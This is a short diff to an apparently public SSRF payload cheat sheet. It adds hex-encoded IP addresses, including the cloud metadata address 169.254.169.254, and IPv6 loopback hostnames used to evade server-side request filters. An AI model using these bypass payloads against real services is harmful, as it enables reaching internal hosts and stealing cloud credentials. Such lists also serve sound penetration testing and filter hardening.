@@ -178,6 +178,12 @@ http://127.0.1
     http://0o177.0.0.1/ = http://127.0.0.1
     http://q177.0.0.1/ = http://127.0.0.1
     ```
+ * Hex IP
+    ```powershell
+    http://0x7f000001 = http://127.0.0.1
+    http://0xc0a80101 = http://192.168.1.1
+    http://0xa9fea9fe = http://169.254.169.254
+    ```
 
 ### Bypass Using Different Encoding
 
@@ -195,6 +201,14 @@ http://127.0.1
     ```
 
 * Unicode encoding: In some languages (.NET, Python 3) regex supports unicode by default. `\d` includes `0123456789` but also `๐๑๒๓๔๕๖๗๘๙`.
+
+### Bypassing via ipv6 hostname
+
+* in Linux /etc/hosts contain this line `::1   localhost ip6-localhost ip6-loopback` but work only if http server running in ipv6
+   ```powershell
+   http://ip6-localhost = ::1
+   http://ip6-loopback = ::1
+   ```
 
 ### Bypassing Using a Redirect
 
